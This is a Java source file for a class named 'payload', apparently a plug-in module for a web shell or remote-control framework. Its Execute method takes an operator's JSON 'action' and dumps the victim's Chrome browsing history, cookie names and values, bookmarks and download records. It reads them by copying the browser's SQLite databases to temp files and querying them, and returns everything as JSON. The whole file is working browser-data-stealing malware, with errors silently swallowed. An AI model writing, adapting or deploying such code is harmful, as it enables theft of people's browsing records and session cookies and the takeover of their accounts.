import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.time.Instant;
import java.time.LocalDateTime;
import java.time.ZoneId;
import java.time.format.DateTimeFormatter;

public class payload {
    private String m_szLocalAppData = System.getenv("LOCALAPPDATA");
    private String m_szAppData = System.getenv("APPDATA");

    private String m_szUserDataFile = Paths.get(m_szLocalAppData, "Google", "Chrome", "User Data").toString();
    private String m_szProfile = "Default";

    public payload() { }

    private String getDefaultDir() {
        return Paths.get(m_szUserDataFile, m_szProfile).toString();
    }

    private String getHistoryFile() {
        return Paths.get(getDefaultDir(), "History").toString();
    }

    private String getBookMarkFile() {
        return Paths.get(getDefaultDir(), "Bookmarks").toString();
    }

    private String fnExtractJsonValue(String json, String key) {
        String pattern = "\"" + key + "\"\\s*:\\s*\"?([^\",}]+)\"?";
        Pattern r = Pattern.compile(pattern);
        Matcher m = r.matcher(json);
        if (m.find()) {
            return m.group(1).trim();
        }
        return "";
    }

    private String fnChromeTimeToDateTime(long chromeTime) {
        try {
            long javaEpochMillis = (chromeTime / 1000L) - 11644473600000L;
            LocalDateTime dateTime = LocalDateTime.ofInstant(
                Instant.ofEpochMilli(javaEpochMillis), ZoneId.systemDefault()
            );
            return dateTime.format(DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss"));
        } catch (Exception e) {
            return "";
        }
    }

    private String serializeToJson(Object obj) {
        if (obj instanceof Map) {
            StringBuilder sb = new StringBuilder();
            sb.append("{");
            boolean first = true;
            for (Map.Entry<?, ?> entry : ((Map<?, ?>) obj).entrySet()) {
                if (!first) sb.append(",");
                sb.append("\"").append(entry.getKey()).append("\":").append(serializeToJson(entry.getValue()));
                first = false;
            }
            sb.append("}");
            return sb.toString();
        } else if (obj instanceof List) {
            StringBuilder sb = new StringBuilder();
            sb.append("[");
            boolean first = true;
            for (Object item : (List<?>) obj) {
                if (!first) sb.append(",");
                sb.append(serializeToJson(item));
                first = false;
            }
            sb.append("]");
            return sb.toString();
        } else if (obj instanceof String) {
            String escaped = ((String) obj).replace("\\", "\\\\").replace("\"", "\\\"");
            return "\"" + escaped + "\"";
        } else if (obj == null) {
            return "null";
        } else if (obj instanceof Boolean) {
            return ((Boolean) obj) ? "true" : "false";
        } else if (obj instanceof Number) {
            return obj.toString();
        } else {
            String escaped = obj.toString().replace("\\", "\\\\").replace("\"", "\\\"");
            return "\"" + escaped + "\"";
        }
    }

    private List<Map<String, Object>> fnDumpHistory() {
        List<Map<String, Object>> lsResult = new ArrayList<>();
        File histFile = new File(getHistoryFile());
        if (!histFile.exists())
            return lsResult;

        File tempFile = null;
        try {
            tempFile = File.createTempFile("sqlite_", ".db");
            Files.copy(histFile.toPath(), tempFile.toPath(), StandardCopyOption.REPLACE_EXISTING);

            String urlConn = "jdbc:sqlite:" + tempFile.getAbsolutePath();
            Class.forName("org.sqlite.JDBC");

            try (
                java.sql.Connection conn = java.sql.DriverManager.getConnection(urlConn);
                java.sql.Statement stat = conn.createStatement();
                java.sql.ResultSet rs = stat.executeQuery("SELECT url, title, last_visit_time FROM urls")
            ) {
                while (rs.next()) {
                    String url = rs.getString("url");
                    String title = rs.getString("title");
                    long lastVisitTime = rs.getLong("last_visit_time");

                    if (url != null && !url.isEmpty()) {
                        Map<String, Object> map = new HashMap<>();
                        map.put("URL", url != null ? url : "");
                        map.put("Title", title != null ? title : "");
                        map.put("LastUsed", lastVisitTime > 0 ? fnChromeTimeToDateTime(lastVisitTime) : "");

                        lsResult.add(map);
                    }
                }
            }
        } catch (Exception ignored) {
            // do nothing
        } finally {
            if (tempFile != null && tempFile.exists()) {
                tempFile.delete();
            }
        }

        return lsResult;
    }

    private List<Map<String, Object>> fnDumpCookie() {
        List<Map<String, Object>> lsResult = new ArrayList<>();
        
        String cookiePath = Paths.get(getDefaultDir(), "Network", "Cookies").toString();
        File cookieFile = new File(cookiePath);
        if (!cookieFile.exists()) {
            cookieFile = new File(Paths.get(getDefaultDir(), "Cookies").toString());
            if (!cookieFile.exists()) return lsResult;
        }

        File tempFile = null;
        try {
            tempFile = File.createTempFile("sqlite_cookie_", ".db");
            Files.copy(cookieFile.toPath(), tempFile.toPath(), StandardCopyOption.REPLACE_EXISTING);

            String urlConn = "jdbc:sqlite:" + tempFile.getAbsolutePath();
            Class.forName("org.sqlite.JDBC");

            try (
                java.sql.Connection conn = java.sql.DriverManager.getConnection(urlConn);
                java.sql.Statement stat = conn.createStatement();
                java.sql.ResultSet rs = stat.executeQuery("SELECT host_key, name, value FROM cookies")
            ) {
                while (rs.next()) {
                    String hostKey = rs.getString("host_key");
                    String name = rs.getString("name");
                    String value = rs.getString("value");

                    Map<String, Object> map = new HashMap<>();
                    map.put("Host", hostKey != null ? hostKey : "");
                    map.put("Name", name != null ? name : "");
                    map.put("Value", value != null ? value : "");
                    
                    lsResult.add(map);
                }
            }
        } catch (Exception ignored) {
            // do nothing
        } finally {
            if (tempFile != null && tempFile.exists()) {
                tempFile.delete();
            }
        }

        return lsResult;
    }

    private List<Map<String, Object>> fnDumpBookmark() {
        List<Map<String, Object>> lsResult = new ArrayList<>();
        Path bookmarkPath = Paths.get(getBookMarkFile());
        if (!Files.exists(bookmarkPath)) return lsResult;

        try {
            String content = new String(Files.readAllBytes(bookmarkPath), StandardCharsets.UTF_8);
            Matcher matches = Pattern.compile("\"name\":\\s*\"(.*?)\",\\s*\"type\":\\s*\"url\",\\s*\"url\":\\s*\"(.*?)\"").matcher(content);
            while (matches.find()) {
                Map<String, Object> map = new HashMap<>();
                map.put("Name", matches.group(1));
                map.put("URL", matches.group(2));
                map.put("Path", "Bookmarks Bar");
                lsResult.add(map);
            }
        } catch (Exception ignored) {
        }
        return lsResult;
    }

    private List<Map<String, Object>> fnDumpDownload() {
        List<Map<String, Object>> lsResult = new ArrayList<>();
        File histFile = new File(getHistoryFile());
        if (!histFile.exists())
            return lsResult;

        File tempFile = null;
        try {
            tempFile = File.createTempFile("sqlite_dl_", ".db");
            Files.copy(histFile.toPath(), tempFile.toPath(), StandardCopyOption.REPLACE_EXISTING);

            String urlConn = "jdbc:sqlite:" + tempFile.getAbsolutePath();
            Class.forName("org.sqlite.JDBC");

            try (
                java.sql.Connection conn = java.sql.DriverManager.getConnection(urlConn);
                java.sql.Statement stat = conn.createStatement();
                java.sql.ResultSet rs = stat.executeQuery("SELECT target_path, tab_url, total_bytes, start_time FROM downloads")
            ) {
                while (rs.next()) {
                    Map<String, Object> map = new HashMap<>();
                    map.put("FileName", rs.getString("target_path"));
                    map.put("TargetPath", rs.getString("target_path"));
                    map.put("URL", rs.getString("tab_url"));
                    map.put("Length", rs.getLong("total_bytes"));
                    map.put("Date", rs.getString("start_time"));

                    lsResult.add(map);
                }
            }
        } catch (Exception ignored) {
            // do nothing
        } finally {
            if (tempFile != null && tempFile.exists()) {
                tempFile.delete();
            }
        }

        return lsResult;
    }

    public String Execute(Object param) throws Exception {
        try {
            if (!(param instanceof java.util.Map)) {
                return "[-] ERROR: Param is not Map.";
            }

            java.util.Map<?, ?> mapParam = (java.util.Map<?, ?>) param;
            String szJson = (String) mapParam.get("json");

            Object objContext = mapParam.get("context");
            Object request = null;

            if (objContext instanceof Object[]) {
                Object[] arr = (Object[]) objContext;
                request = arr[0];
            } else {
                request = objContext;
            }

            if (request == null) {
                return "[-] ERROR: Cannot extract Request from nested context map.";
            }

            String szAction = fnExtractJsonValue(szJson, "action");
            String szProfile = fnExtractJsonValue(szJson, "profile");

            if (szProfile != null && !szProfile.isEmpty()) {
                m_szProfile = szProfile;
            }

            Map<String, Object> objResponse = new HashMap<>();
            objResponse.put("status", "success");
            objResponse.put("action", szAction);

            List<Map<String, Object>> resultData = null;
            if (szAction.equals("history")) {
                resultData = fnDumpHistory();
            } else if (szAction.equals("cookie")) {
                resultData = fnDumpCookie();
            } else if (szAction.equals("bookmark")) {
                resultData = fnDumpBookmark();
            } else if (szAction.equals("download")) {
                resultData = fnDumpDownload();
            } else {
                return "[-] Unknown action: " + szAction;
            }

            List<Object> list = new ArrayList<>(resultData);
            objResponse.put("data", list);

            return serializeToJson(objResponse);

        } catch (Exception ex) {
            return "[-] " + ex.getMessage();
        }
    }
}